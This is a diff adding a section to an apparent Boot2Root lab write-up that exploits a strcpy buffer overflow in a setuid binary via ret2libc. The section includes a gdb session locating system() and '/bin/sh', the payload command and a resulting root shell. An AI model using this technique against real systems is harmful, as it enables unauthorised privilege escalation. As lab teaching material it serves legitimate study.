@@ -1,4 +1,3 @@
-
 # Initial Access
 
 When I first booted the machine, I couldn't see an IP address as mentioned in the PDF. To establish a connection, I needed to perform a port scan to identify the available ports and determine how to connect to the machine.
@@ -2995,3 +2994,131 @@ bool main(int param_1,int param_2)
 ```
 
 When we analyze the code, we see that it allocates a 140-byte space, but because it uses strcpy, there is a vulnerability here.
+
+How will we exploit this vulnerability?
+
+```
+zaz@BornToSecHackMe:~$ gdb ./exploit_me 
+
+
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "i686-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>...
+Reading symbols from /home/zaz/exploit_me...(no debugging symbols found)...done.
+
+
+(gdb) b main
+Breakpoint 1 at 0x80483f7
+
+
+(gdb) run
+Starting program: /home/zaz/exploit_me
+
+Breakpoint 1, 0x080483f7 in main ()
+```
+
+Next, we need to get the address of the system function because the command we will essentially execute is:
+**`system("/bin/sh");`**
+
+```
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+```
+```
+system = 0xb7e6b060
+little endian = \x60\xb0\xe6\xb7
+```
+
+Now that we have obtained the memory address of the system function, we need to use "/bin/sh" next. Using the libraries that the program uses, we will search for the **`"/bin/sh"`** command.
+
+```
+(gdb) info proc map
+
+
+process 2962
+Mapped address spaces:
+
+        Start Addr   End Addr       Size     Offset objfile
+         0x8048000  0x8049000     0x1000        0x0 /home/zaz/exploit_me
+         0x8049000  0x804a000     0x1000        0x0 /home/zaz/exploit_me
+        0xb7e2b000 0xb7e2c000     0x1000        0x0
+        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
+        0xb7fd2000 0xb7fd5000     0x3000        0x0
+        0xb7fdb000 0xb7fdd000     0x2000        0x0
+        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
+        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
+        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
+        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
+(gdb)
+```
+
+As we can see in the memory address range between **`0xb7e2c000`** and **`0xb7fd2000`**, it uses **`/lib/i386-linux-gnu/libc-2.15.so`**.
+Let's search for **`"/bin/sh"`** in this memory range.
+
+```
+(gdb) find 0xb7e2c000,0xb7fd2000,"/bin/sh"
+0xb7f8cc58
+1 pattern found.
+```
+
+``` 
+"/bin/sh" = 0xb7f8cc58 
+little endian = \x58\xcc\xf8\b7
+```
+
+Now that we have reached our goal, we have a memory address for the system function plus another memory address for "/bin/sh".
+
+Therefore, it's time to exploit the vulnerability.
+
+```
+zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "A"*140 + "\x60\xb0\xe6\xb7" + "A"*4 + "\x58\xcc\xf8\xb7"')
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`��AAAAX���
+
+# whoami
+root
+
+# id
+uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)
+```
+
+
+### How did we exploit the vulnerability?
+
+Let's break down each component of our exploit:
+
+1. **Buffer Overflow with `"A"*140`**
+   - Fills the buffer with 140 'A' characters
+   - Overflows past the buffer's boundaries
+   - Overwrites the saved EBP (Base Pointer)
+   - Positions us to control the return address (EIP)
+
+2. **System Function Address `"\x60\xb0\xe6\xb7"`**
+   - Address of libc's system() function
+   - Written in little-endian format
+   - Overwrites the return address
+   - Program execution will jump here
+
+3. **Return Address Placeholder `"A"*4`**
+   - 4 bytes of dummy data
+   - Would normally be the return address after system() call
+   - Not important since we won't return from shell
+   - Could be any 4 bytes of data
+
+4. **Shell String Address `"\x58\xcc\xf8\xb7"`**
+   - Points to "/bin/sh" string in memory
+   - Found in libc memory space
+   - Written in little-endian format
+   - Passed as argument to system()
+
+
+FINALLY WE ARE ROOT ;D
